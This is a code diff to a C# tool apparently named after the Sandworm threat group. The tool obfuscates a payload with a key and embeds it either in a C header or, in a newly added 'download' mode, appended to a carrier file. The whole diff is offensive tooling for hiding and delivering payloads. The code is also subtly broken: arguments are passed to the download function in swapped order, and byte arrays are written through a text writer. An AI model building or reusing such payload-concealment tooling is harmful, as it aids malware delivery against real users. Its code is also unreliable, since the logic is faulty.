@@ -10,17 +10,37 @@ namespace sandworm_payload_builder
     {
         static void Main(string[] args)
         {
-            string payloadFile = args[0];
+            string payloadType = args[0];
 
-            string obfuscatedPayloadFile = args[1];
+            string payloadFile = args[1];
 
-            string keyFile = args[2];
+            string obfuscatedPayloadFile = args[2];
 
-            string payloadIncludeFile = args[3];
+            string keyFile = args[3];
+
+            string payloadHeaderFile = args[4];
+
+            string payloadCarrierFile = String.Empty;
+
+            string payloadDownloadFile = String.Empty;
+
+            if (payloadType == "download")
+            {
+                payloadCarrierFile = args[5];
+
+                payloadDownloadFile = args[6];
+            }
 
             CreateObfuscatedPayload(payloadFile, obfuscatedPayloadFile, keyFile);
 
-            CreatePayloadHeader(obfuscatedPayloadFile, keyFile, payloadIncludeFile);
+            if (payloadType == "header")
+            {
+                CreatePayloadHeader(keyFile, obfuscatedPayloadFile, payloadHeaderFile);
+            }
+            else if (payloadType == "download")
+            {
+                CreatePayloadDownload(obfuscatedPayloadFile, keyFile, payloadHeaderFile, payloadCarrierFile, payloadDownloadFile);
+            }
         }
 
         static private bool CreateObfuscatedPayload(string payloadFile, string obfuscatedPayloadFile, string keyFile)
@@ -38,15 +58,8 @@ namespace sandworm_payload_builder
             return true;
         }
 
-        static private bool CreatePayloadHeader(string obfuscatedPayloadFile, string keyFile, string headerFile)
+        static private bool WritePrologHeader(StreamWriter writer)
         {
-            byte[] payload = File.ReadAllBytes(obfuscatedPayloadFile);
-
-            byte[] key = File.ReadAllBytes(keyFile);
-
-            StreamWriter writer = new StreamWriter(headerFile);
-
-            // Prolog
             writer.WriteLine("#pragma once");
 
             writer.Write(Environment.NewLine);
@@ -55,11 +68,13 @@ namespace sandworm_payload_builder
 
             writer.WriteLine("#include <stdint.h>");
 
-            writer.Write(Environment.NewLine);
-            writer.Write(Environment.NewLine);
-            writer.Write(Environment.NewLine);
+            return true;
+        }
 
-            // Key
+        static private bool WriteKeyHeader(StreamWriter writer, string keyFile)
+        {
+            byte[] key = File.ReadAllBytes(keyFile);
+
             StringBuilder hexKey = new StringBuilder();
 
             foreach (byte b in key)
@@ -67,13 +82,25 @@ namespace sandworm_payload_builder
                 hexKey.AppendFormat("{0:x2}", b);
             }
 
+            writer.WriteLine("#include \"xObfuscation.h\"");
+
+            writer.Write(Environment.NewLine);
+            writer.Write(Environment.NewLine);
+            writer.Write(Environment.NewLine);
+
             writer.WriteLine("#define X_PAYLOAD_KEY\tX_OBFUSCATED_STRING_A(\"{0}\")", hexKey.ToString());
 
+            return true;
+        }
+
+        static private bool WritePayloadHeader(StreamWriter writer, string payloadFile)
+        {
             writer.Write(Environment.NewLine);
             writer.Write(Environment.NewLine);
             writer.Write(Environment.NewLine);
 
-            // Payload
+            byte[] payload = File.ReadAllBytes(payloadFile);
+
             StringBuilder hexPayload = new StringBuilder();
 
             int last = payload.Count() - 1;
@@ -110,7 +137,44 @@ namespace sandworm_payload_builder
 
             writer.WriteLine("};");
 
+            return true;
+        }
+
+        static private bool CreatePayloadHeader(string keyFile, string payloadFile, string headerFile)
+        {
+            StreamWriter writer = new StreamWriter(headerFile);
+
+            WritePrologHeader(writer);
+
+            WriteKeyHeader(writer, keyFile);
+
+            WritePayloadHeader(writer, payloadFile);
+
             writer.Close();
+
+            return true;
+        }
+        static private bool CreatePayloadDownload(string keyFile, string payloadFile, string headerFile, string carrierFile, string downloadFile)
+        {
+            StreamWriter writerHeader = new StreamWriter(headerFile);
+
+            WritePrologHeader(writerHeader);
+
+            WriteKeyHeader(writerHeader, keyFile);
+
+            writerHeader.Close();
+
+            StreamWriter writerDownload = new StreamWriter(downloadFile);
+
+            writerDownload.Write(File.ReadAllBytes(carrierFile));
+
+            byte[] payload = File.ReadAllBytes(payloadFile);
+
+            writerDownload.Write(payload);
+
+            writerDownload.Write(payload.Count());
+
+            writerDownload.Close();
 
             return true;
         }
